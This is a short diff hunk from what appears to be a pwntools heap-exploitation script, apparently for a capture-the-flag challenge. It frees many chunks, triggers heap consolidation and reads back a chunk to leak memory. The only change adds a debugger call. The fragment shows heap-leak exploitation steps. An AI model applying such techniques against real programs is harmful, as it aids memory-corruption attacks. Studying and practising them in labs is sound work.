@@ -53,6 +53,7 @@ for i in range(20):
 for i in range(19):
     free(i)
 trigger_consolidate(0x500)
+gdbs()
 alloc(0x60,b"a"*0x10)
 show(0)
 p.recvuntil(b"a"*0x10)
